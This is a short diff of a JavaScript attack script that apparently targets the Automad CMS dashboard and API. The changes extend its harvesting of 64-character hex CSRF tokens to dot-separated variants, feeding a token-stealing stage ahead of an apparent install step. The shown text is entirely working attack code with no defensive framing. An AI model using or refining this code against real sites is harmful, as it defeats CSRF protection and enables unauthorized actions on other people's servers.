@@ -19,7 +19,9 @@ const cmd=()=>{
 };
 const candidates=new Set();
 const addCandidates=d=>{
- let m=(d.toLowerCase().match(/[a-f0-9]{64}/g)||[]);
+ let low=d.toLowerCase();
+ let m=(low.match(/[a-f0-9]{64}/g)||[]);
+ m=m.concat((low.match(/(?:[a-f0-9]\.){63}[a-f0-9]/g)||[]).map(x=>x.replace(/\./g,'')));
  for(let x of m){
   if(candidates.size>=60)break;
   if(/^([a-f0-9])\1+$/.test(x))continue;
@@ -50,8 +52,9 @@ const tryInstall=()=>{
 const tryChunk=d=>{
  let low=d.toLowerCase();
  addCandidates(low);
- if(!(low.includes('csrf')||low.includes('__csrf__')||low.includes('automad')||low.includes('dashboard')||low.includes('/_api')))return '';
+ if(!(low.includes('csrf')||low.includes('c.s.r.f')||low.includes('__csrf__')||low.includes('_._.c.s.r.f')||low.includes('automad')||low.includes('a.u.t.o.m.a.d')||low.includes('dashboard')||low.includes('d.a.s.h.b.o.a.r.d')||low.includes('/_api')))return '';
  let m=low.match(/[a-f0-9]{64}/g)||[];
+ m=m.concat((low.match(/(?:[a-f0-9]\.){63}[a-f0-9]/g)||[]).map(x=>x.replace(/\./g,'')));
  return m.find(x=>!/^0+$/.test(x))||'';
 };
 post('stage start');
